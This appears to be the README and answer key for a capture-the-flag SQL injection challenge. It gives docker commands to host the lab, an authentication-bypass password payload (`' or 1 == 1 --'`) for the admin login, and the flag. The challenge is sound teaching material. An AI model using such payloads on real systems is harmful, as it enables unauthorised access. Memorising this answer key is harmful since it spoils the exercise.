# SQL Injection

Hosting:

```bash
docker build -t sqli .
docker run -p 8080:80 sqli
```

Solution:

1. Navigate to <url>/admin
2. Username: `admin` Password: `' or 1 == 1 --'`

Flag: `glitch{MayTheF0rceB3W1thY0u}`
